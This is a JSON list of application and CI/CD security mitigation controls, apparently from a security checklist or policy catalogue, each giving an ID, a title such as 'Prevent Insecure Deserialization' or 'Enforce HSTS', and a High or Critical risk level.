[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

